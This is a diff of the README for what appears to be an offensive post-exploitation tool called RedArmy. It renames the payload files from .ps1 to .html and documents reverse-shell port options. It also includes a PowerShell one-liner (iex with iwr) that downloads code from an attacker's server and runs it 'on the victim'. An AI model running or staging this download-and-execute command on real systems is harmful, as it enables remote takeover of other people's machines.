@@ -68,13 +68,13 @@ Options:
     -c, --config=FILE    Use the specified config
     -h, --help           Display this help message
     --invade=FILE        Use the specified invade filename instead of
-                         invade.ps1
+                         invade.html
     --no-color           Disable colorized output
     -p, --port=NUM       Use the specified port (default: 8080)
     -r, --rport=NUM      Use the specified port for reverse shell
                          (default: 4444)
     --rshell=FILE        Use the specified rshell filename instead of
-                         rshell.ps1
+                         rshell.html
     -u, --update         Update git submodules
 ```
 
@@ -82,7 +82,7 @@ Once the `serve` script is running, you can use the following to load
 RedArmy on the victim:
 
 - `iex (iwr -DisableKeepAlive -UseBasicParsing
-  http://<ip>:<port>/invade.ps1)`
+  http://<ip>:<port>/invade.html)`
 
 That command will also displayed for you to copy and paste for
 convenience.
